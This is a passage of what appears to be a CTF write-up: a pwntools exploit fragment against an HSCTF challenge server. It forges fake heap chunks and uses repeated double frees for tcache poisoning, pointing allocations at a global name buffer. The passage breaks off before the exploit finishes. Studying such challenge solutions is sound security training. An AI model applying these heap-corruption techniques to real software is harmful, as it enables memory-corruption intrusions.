...
###Exploit
r = remote('pwn.hsctf.com',3232)
r.sendafter('name > ',p64(0x91)+p64(0)+p64(0x108)+p64(0)*14+p64(0)+p64(0x21)+p64(0))

create(0xf8,'a')
delete()
delete()
create(0xf8,p64(name+0x18))
create(0xf8,'a')
create(0xf8,p64(0)*14+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))

create(0x88,'a')
delete()
delete()
create(0x88,p64(name+0x8))
create(0x88,'a')
create(0x88,'hello')
delete()
